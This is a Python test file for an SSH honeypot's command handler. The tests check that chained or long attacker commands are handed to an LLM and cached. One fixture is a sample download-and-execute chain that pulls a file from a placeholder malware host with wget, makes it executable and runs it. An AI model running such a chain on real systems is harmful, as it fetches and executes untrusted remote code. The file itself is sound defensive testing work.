
import pytest
from unittest.mock import MagicMock
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from ssh_honeypot.command_handler import CommandHandler

class TestLongCommands:
    @pytest.fixture
    def handler(self):
        mock_llm = MagicMock()
        mock_db = MagicMock()
        h = CommandHandler(mock_llm, mock_db)
        # Mock handle_generic to verify delegation
        h.handle_generic = MagicMock(return_value=("generic_response", {}, {'source': 'llm'}))
        return h

    def test_complex_chain_detection(self, handler):
        # 1. Chained with && (Should trigger)
        cmd = "cd /tmp && wget http://malware.com && chmod +x malware && ./malware"
        resp, _, meta = handler.process_command(cmd, {})
        
        handler.handle_generic.assert_called_once()
        assert resp == "generic_response"
        
    def test_long_command_length(self, handler):
        # 2. Very long command > 150 chars
        cmd = "echo " + "A" * 200
        handler.handle_generic.reset_mock()
        
        resp, _, meta = handler.process_command(cmd, {})
        handler.handle_generic.assert_called_once()
        
    def test_simple_command_pass(self, handler):
        # 3. Simple command (Should NOT trigger)
        cmd = "ls -la"
        # Mock handle_ls to ensure it doesn't crash if called
        handler.handle_ls = MagicMock(return_value=("ls_output", {}, {'source': 'local'}))
        handler.handle_generic.reset_mock()
        
        resp, _, meta = handler.process_command(cmd, {})
        
        handler.handle_generic.assert_not_called()
        handler.handle_ls.assert_called_once()

    def test_semicolon_pass(self, handler):
        # 4. Simple semicolon chain (Should NOT trigger if < 3 semicolons and short)
        cmd = "echo A ; echo B"
        # Mock handle_echo
        handler.handle_echo = MagicMock(return_value=("echo_out", {}, {'source': 'local'}))
        handler.handle_generic.reset_mock()
        
        resp, _, meta = handler.process_command(cmd, {})
        
        handler.handle_generic.assert_not_called()
        # Should split and call echo twice
        assert handler.handle_echo.call_count == 2

    def test_full_chain_offloading_integration(self):
        """
        Verify that a complex command actually goes through 
        cache check -> LLM -> cache save flow.
        """
        mock_llm = MagicMock()
        mock_db = MagicMock()
        h = CommandHandler(mock_llm, mock_db)
        # Use REAL handle_generic, do NOT mock it.
        
        # Setup mocks for dependencies
        context = {'cwd': '/root', 'session_id': 'test_sess'}
        chain_cmd = "apt-get update && apt-get install malware -y"
        
        # 1. Cache Miss
        mock_db.get_cached_response.return_value = None
        
        # 2. LLM Response
        mock_llm.generate_response.return_value = '{"output": "installing malware...", "new_cwd": "/root"}'
        
        # Act
        resp, updates, meta = h.process_command(chain_cmd, context)
        
        # Assertions
        # 1. Check routing to handle_generic (implied by cache check on FULL command)
        mock_db.get_cached_response.assert_called_with(chain_cmd, '/root')
        
        # 2. Check LLM Call
        mock_llm.generate_response.assert_called_once()
        args, _ = mock_llm.generate_response.call_args
        assert args[0] == chain_cmd # First arg is command
        
        # 3. Check Caching
        mock_db.cache_response.assert_called_once()
        # Verify it cached the LLM response
        assert "installing malware" in str(mock_db.cache_response.call_args)
        
        # 4. Check Return
        assert "installing malware" in resp
        assert meta['source'] == 'llm'

    def test_complex_chain_cache_hit(self):
        """
        Verify that a complex command uses the cache if available.
        """
        mock_llm = MagicMock()
        mock_db = MagicMock()
        h = CommandHandler(mock_llm, mock_db)
        
        context = {'cwd': '/root', 'session_id': 'test_sess'}
        # Must contain && or ;; or be long to trigger offload
        chain_cmd = "echo A && echo B"
        
        # 1. Cache HIT
        # db.get_cached_response returns raw text or JSON string
        mock_db.get_cached_response.return_value = '{"output": "CACHED_OUTPUT", "new_cwd": "/root"}'
        
        # Act
        resp, updates, meta = h.process_command(chain_cmd, context)
        
        # Assertions
        mock_db.get_cached_response.assert_called_with(chain_cmd, '/root')
        mock_llm.generate_response.assert_not_called() # Should NOT hit LLM
        
        assert resp == "CACHED_OUTPUT"
        assert meta['source'] == 'cache'
        assert meta['cached'] is True
